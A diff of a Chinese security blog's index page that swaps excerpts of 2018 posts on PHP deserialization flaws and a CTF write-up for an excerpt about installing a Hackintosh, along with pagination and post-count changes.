-    <link itemprop="mainEntityOfPage" href="https://ashin9.github.io/2018/09/27/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%88%90%E5%9B%A0%E5%8F%8A%E5%88%A9%E7%94%A8/">
+    <link itemprop="mainEntityOfPage" href="https://ashin9.github.io/2019/03/10/CTFer%E7%9A%84%E9%BB%91%E8%8B%B9%E6%9E%9C%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE%E5%BF%83%E5%BE%97/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/dxx.jpg">
@@ -351,7 +519,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2018/09/27/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%88%90%E5%9B%A0%E5%8F%8A%E5%88%A9%E7%94%A8/" class="post-title-link" itemprop="url">反序列化漏洞的成因及利用</a>
+            <a href="/2019/03/10/CTFer%E7%9A%84%E9%BB%91%E8%8B%B9%E6%9E%9C%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE%E5%BF%83%E5%BE%97/" class="post-title-link" itemprop="url">CTFer的黑苹果安装与配置心得</a>
         </h2>
 
         <div class="post-meta">
@@ -361,14 +529,14 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2018-09-27 17:48:14" itemprop="dateCreated datePublished" datetime="2018-09-27T17:48:14+08:00">2018-09-27</time>
+              <time title="创建时间：2019-03-10 19:52:06" itemprop="dateCreated datePublished" datetime="2019-03-10T19:52:06+08:00">2019-03-10</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-03-15 09:08:07" itemprop="dateModified" datetime="2023-03-15T09:08:07+08:00">2023-03-15</time>
+                <time title="修改时间：2023-03-15 09:04:37" itemprop="dateModified" datetime="2023-03-15T09:04:37+08:00">2023-03-15</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -376,11 +544,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/WEB%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">WEB安全</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/WEB%E5%AE%89%E5%85%A8/Server%E7%AB%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Server端安全</span></a>
+                  <a href="/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" itemprop="url" rel="index"><span itemprop="name">操作系统</span></a>
                 </span>
             </span>
 
@@ -395,206 +559,13 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h5 id="接着上篇继续讲：反序列化漏洞"><a href="#接着上篇继续讲：反序列化漏洞" class="headerlink" title="接着上篇继续讲：反序列化漏洞"></a>接着上篇继续讲：反序列化漏洞</h5><h3 id="0x01-本质无害"><a href="#0x01-本质无害" class="headerlink" title="0x01 本质无害"></a>0x01 本质无害</h3><ul>
-<li><p>反序列化的数据本质上来说是没有危害的</p>
-</li>
-<li><p>用户可控数据进行反序列化是存在危害的</p>
-</li>
-</ul>
-<h3 id="0x02-漏洞根源"><a href="#0x02-漏洞根源" class="headerlink" title="0x02 漏洞根源"></a>0x02 漏洞根源</h3><ul>
-<li><p>根本原因:程序没有对用户输入的反序列化字符串进行检测，导致反序列化过程可以被恶意控制，进而造成代码执行、getshell等一系列不可控的后果。 </p>
-</li>
-<li><p>这个漏洞的形成是由于跟serialize和unserialize相关的magic函数违背正确利用的缘故。 在反序列化时，如果反序列化对象中存在魔法函数，使用unserialize()函数同时也会触发。这样，一旦我们能够控制unserialize()入口，那么就可能引发对象注入漏洞。</p>
-</li>
-</ul>
+          <h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>从寒假到开学第一周，每晚在床上都是看关于黑苹果的东西，从一无所知到渐渐明白。</p>
+<p>在 Joker 表哥指导交流下，过程还算顺利，一天多就搞定了。当然，中间也遇到了很多麻烦， 安装成功只是成功吃到黑苹果的一半。由Win切换到Mac，环境配置、软件破解等等更麻烦。 </p>
+<p>收获也很多。记录下来，自己加深记忆的同时也供大家参考吧。</p>
+<h4 id="关于为什么要搞黑苹果？又穷又酸"><a href="#关于为什么要搞黑苹果？又穷又酸" class="headerlink" title="关于为什么要搞黑苹果？又穷又酸"></a>关于为什么要搞黑苹果？又穷又酸</h4>
           <!--noindex-->
             <div class="post-button">
-              <a class="btn" href="/2018/09/27/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%88%90%E5%9B%A0%E5%8F%8A%E5%88%A9%E7%94%A8/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://ashin9.github.io/2018/09/27/%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E7%90%86%E8%A7%A3/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/dxx.jpg">
-      <meta itemprop="name" content="Ashing">
-      <meta itemprop="description" content="Cyber Security">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Ashing's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2018/09/27/%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E7%90%86%E8%A7%A3/" class="post-title-link" itemprop="url">序列化、反序列化的理解</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2018-09-27 17:01:03" itemprop="dateCreated datePublished" datetime="2018-09-27T17:01:03+08:00">2018-09-27</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-03-14 21:51:39" itemprop="dateModified" datetime="2023-03-14T21:51:39+08:00">2023-03-14</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/WEB%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">WEB安全</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/WEB%E5%AE%89%E5%85%A8/Server%E7%AB%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Server端安全</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>之前看过反序列化的漏洞，不算是很系统。昨天和小伙伴正好遇到了一道反序列化的题目，借此总结一下。分俩个部分：</p>
-<ul>
-<li><p>1.序列化、反序列化的理解</p>
-</li>
-<li><p>2.反序列化漏洞的成因及利用</p>
-</li>
-</ul>
-<h3 id="0x01-什么是序列化？"><a href="#0x01-什么是序列化？" class="headerlink" title="0x01 什么是序列化？"></a>0x01 什么是序列化？</h3><ul>
-<li><p>序列化： 将数据结构或对象转换成字节序列、二进制串的过程。 </p>
-</li>
-<li><p>反序列化：将在序列化过程中所生成的二进制串转换成数据结构或者对象的过程。</p>
-</li>
-<li><p><strong>注： 字节序是指多字节数据在计算机内存中存储或者网络传输时各字节的存储顺序。</strong></p>
-</li>
-</ul>
-<h3 id="0x02-用处"><a href="#0x02-用处" class="headerlink" title="0x02 用处"></a>0x02 用处</h3>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2018/09/27/%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E7%90%86%E8%A7%A3/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://ashin9.github.io/2018/09/26/Jarvis%20OJ%20Web%20WriteUp(1)/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/dxx.jpg">
-      <meta itemprop="name" content="Ashing">
-      <meta itemprop="description" content="Cyber Security">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Ashing's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2018/09/26/Jarvis%20OJ%20Web%20WriteUp(1)/" class="post-title-link" itemprop="url">Jarvis OJ Web WriteUp(1)</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2018-09-26 21:26:01" itemprop="dateCreated datePublished" datetime="2018-09-26T21:26:01+08:00">2018-09-26</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-03-15 11:20:23" itemprop="dateModified" datetime="2023-03-15T11:20:23+08:00">2023-03-15</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h4 id="PORT51"><a href="#PORT51" class="headerlink" title="PORT51"></a>PORT51</h4><p>一上来看有点懵逼，以为是Burp抓包。最后 google 后发现应该在 vps 上（不用 vps 的话经过路由器可能端口就变了）用以下命令就可以。</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --ocal-port http://xxx.com</span><br></pre></td></tr></table></figure>
-
-<p>之前没有接触过 curl，只是在 docker 里面用过一次。</p>
-<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl就是：Linux中利用 <span class="built_in">URL</span> 规则在命令行下工作的文件传输工具，可以说是一款很强大的 <span class="keyword">http</span> 命令行工具。它支持文件的上传和下载，是综合传输工具，但按传统，习惯称 curl 为下载工具。 </span><br><span class="line">由于安装linux的时候很多时候是没有安装桌面的，也意味着没有浏览器，因此这个方法也经常用于测试一台服务器是否可以到达一个网站。 当然也可以进行ip伪造等等测试操作。</span><br></pre></td></tr></table></figure>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2018/09/26/Jarvis%20OJ%20Web%20WriteUp(1)/#more" rel="contents">
+              <a class="btn" href="/2019/03/10/CTFer%E7%9A%84%E9%BB%91%E8%8B%B9%E6%9E%9C%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE%E5%BF%83%E5%BE%97/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -617,7 +588,7 @@
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/5/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/7/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/page/5/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/7/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -685,7 +656,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">33</span>
+          <span class="site-state-item-count">45</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
